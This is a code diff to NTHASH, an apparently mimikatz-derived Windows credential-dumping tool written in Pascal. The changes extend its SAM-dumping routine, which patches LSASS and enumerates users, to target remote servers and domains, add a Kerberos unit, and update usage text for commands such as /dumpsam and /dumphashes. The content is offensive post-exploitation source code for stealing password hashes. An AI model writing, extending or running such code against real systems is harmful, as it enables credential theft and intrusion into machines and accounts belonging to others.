@@ -10,7 +10,7 @@ program NTHASH;
 uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,
   uadvapi32, uversion, utils, umemory, ucryptoapi, usamutils, uofflinereg,
   uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport, wtsapi32, uwmi, base64,
-  udpapi,udebug,injection, usecur32,memfuncs, uhandles,pe, uXor;
+  udpapi,udebug,injection, usecur32,memfuncs, uhandles,pe, uXor,kerberos;
 
 
 //***************************************************************************
@@ -374,7 +374,7 @@ end;
 
 //https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
 //https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
-function dumpsam(pid:dword;user:string):boolean;
+function dumpsam(pid:dword;user,server,domain:string):boolean;
 //*****************************************************
 function Init_Int_User_Info:tbytes;
 const
@@ -489,7 +489,7 @@ begin
                                         log('patch ok',0);
                                         try
                                         log('***************************************',0);
-                                        if QueryUsers ('','',@callback_QueryUser )=true
+                                        if QueryUsers (pchar(server),pchar(domain),@callback_QueryUser )=true
                                         //if QueryInfoUser (user)=true
                                            then begin log('SamQueryInformationUser OK',0);result:=true;end
                                            else log('SamQueryInformationUser NOT OK',1);
@@ -951,7 +951,9 @@ ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
   StartupInfo.lpDesktop := 'WinSta0\Default';
   for i:=4 downto 0 do
     begin
-    result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),NORMAL_PRIORITY_CLASS,
+    //no create_new_console here?
+    result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),
+    NORMAL_PRIORITY_CLASS,
     nil,pwidechar(widestring(GetCurrentDir)),
     StartupInfo,ProcessInformation,
     TIntegrityLevel(i),
@@ -1208,8 +1210,8 @@ begin
   log('NTHASH /getntlmhash /input:password',1);
   //*******************************************
   log('NTHASH /getsid /user:username [/server:hostname]',1);
-  log('NTHASH /getsids [/server:hostname] [/offline]',1);
-  log('NTHASH /getusers [/server:hostname]',1);
+  log('NTHASH /getsids [/server:hostname] [/domain:domainsid] [/offline]',1);
+  log('NTHASH /getusers [/server:hostname] [/domain:domainsid]',1);
   log('NTHASH /getdomains [/server:hostname]',1);
   log('NTHASH /dumpsam',1);
   log('NTHASH /dumphashes [/offline]',1);
@@ -1984,7 +1986,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   p:=pos('/dumpsam',cmdline);
   if p>0 then
      begin
-     if dumpsam (lsass_pid ,'') then log('OK',1) else log('NOT OK',1);
+     if dumpsam (lsass_pid ,'',server,domain) then log('OK',1) else log('NOT OK',1);
      goto fin;
      end;
   p:=pos('/getntlmhash',cmdline);
